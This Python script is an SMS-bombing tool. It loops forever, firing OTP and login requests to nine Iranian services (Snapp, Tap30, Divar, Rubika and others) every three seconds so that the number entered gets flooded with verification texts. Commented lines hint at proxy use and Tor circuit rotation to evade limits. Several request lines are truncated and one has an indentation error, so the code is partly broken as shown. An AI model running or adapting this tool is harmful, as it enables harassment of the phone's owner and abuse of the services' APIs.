#Made_By_Defalt

import os
import time
import requests
from threading import Thread
from colorama import *

#proxy = {"https": "127.0.0.1:8000"}

print ("programmer : defalt")
print (" ")

def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "16", "x-app-name": "passenger-pwa", "x-ap>
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snap>
        if "OK" in snapR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def shad(phone):
    #shad api
    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/jso>
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send>
    try: shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD) #pr>
        if "OK" in shadR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def gap(phone):
    #gap api
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7>
    try:
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split(>
        if "OK" in gapR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def tap30(phone):
    #tap30 api
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "M>
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D) #proxie>
        if "OK" in tap30R.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
            print (Fore.RED+"Error!")
def emtiaz(phone):
    #emtiaz api
    emH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Contr>
    emD = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD) #proxies=p>
        print (Fore.GREEN+"sended sms:)")
    except:
        print (Fore.RED+"Error!")

def divar(phone):
    #divar api
    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "a>
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=di>
        if "SENT" in divarR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, t>
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_t>
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD) #proxies=pr>
        if "OK" in ruR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def torob(phone):
    #torob api
    torobH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) Apple>
    try:
        torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split(>
        if "sent" in torobR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print(Fore.RED+"Error!")

def bama(phone):
    #bama api
    bamaH = {"Host": "bama.ir","content-length": "22","accept": "application/json, text/javascript,>
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bama>
        if "0" in bamaR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")
    except:
        print (Fore.RED+"Error!")

def main():
    phone = str(input("Made by defalt Enter phone number like (+98xxxxxxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=shad, args=[phone]).start()
        Thread(target=gap, args=[phone]).start()
        Thread(target=tap30, args=[phone]).start()
        Thread(target=emtiaz, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=rubika, args=[phone]).start()
        Thread(target=torob, args=[phone]).start()
        Thread(target=bama, args=[phone]).start()
       #os.system("killall -HUP tor")
        time.sleep(3)


if __name__ == "__main__":
    main()